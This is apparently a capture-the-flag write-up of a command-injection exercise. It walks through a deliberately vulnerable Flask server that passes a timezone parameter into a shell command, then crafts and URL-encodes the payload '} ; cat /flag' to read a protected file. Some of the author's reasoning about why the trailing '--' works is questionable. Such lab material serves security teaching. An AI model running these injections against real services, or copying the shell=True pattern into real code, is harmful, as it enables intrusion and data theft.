## Exercise
Calling shell commands to carry out work, or "shelling out" as it is often termed, is dangerous. Any part of a shell command is potentially injectible! In this level, we'll practice injecting into a slightly different part of a slightly different command.

Let's take a look at the server:
```
> cat /challenge/server

#!/usr/bin/exec-suid -- /usr/bin/python3 -I

import subprocess
import flask
import os

app = flask.Flask(__name__)


@app.route("/step", methods=["GET"])
def challenge():
    arg = flask.request.args.get("timezone-value", "MST")
    command = f"TZ={arg} date"

    print(f"DEBUG: {command=}")
    result = subprocess.run(
        command,  # the command to run
        shell=True,  # use the shell to run this command
        stdout=subprocess.PIPE,  # capture the standard output
        stderr=subprocess.STDOUT,  # 2>&1
        encoding="latin",  # capture the resulting output as text
    ).stdout

    return f"""
        <html><body>
        Welcome to the timezone service! Please choose a timezone to get the time there.
        <form action="/step"><input type=text name=timezone-value><input type=submit value=Submit></form>
        <hr>
        <b>Output of {command}:</b><br>
        <pre>{result}</pre>
        </body></html>
        """


os.setuid(os.geteuid())
os.environ["PATH"] = "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
app.secret_key = os.urandom(8)
app.config["SERVER_NAME"] = "challenge.localhost:80"
app.run("challenge.localhost", 80)
```
The server accepts GET requests on /step. It queries arguments and expects a timezone-value. It stores the command as ``` f"TZ={arg} date"``` and starts a subprocess where the command is run with command as the shell input. Let's try to inject an arg where we can print our flag.
#### Crafting the Inject
Our command is:
```
f"TZ={arg} date"
```
What I expect to print our flag is:
```
f"TZ={} ; cat /flag -- } date"
```
This sets TZ as empty, I ignore the first statement with TZ=} and end the first statement with ;. Afterwards I cat /flag to print the flag. The rest of the command will be ignored via --.
Our arg should therefore be:
```
} ; cat /flag -- 
```
therefore we need to encode ```}, ;, /, -``` and the space characters.
The hex encodings:
```
}  = %7D
;  = %3B
/  = %2F
-  = %2D
SP = %20
```
For the encodings I like to [use](https://www.rapidtables.com/convert/number/ascii-to-hex.html).
Our encoded arg:
```
%7D%20%3B%20cat%20%2Fflag%20%2D%2D%20
```
Our crafted link:
```
http://challenge.localhost:80/step?timezone-value=%7D%20%3B%20cat%20%2Fflag%20%2D%2D%20
```
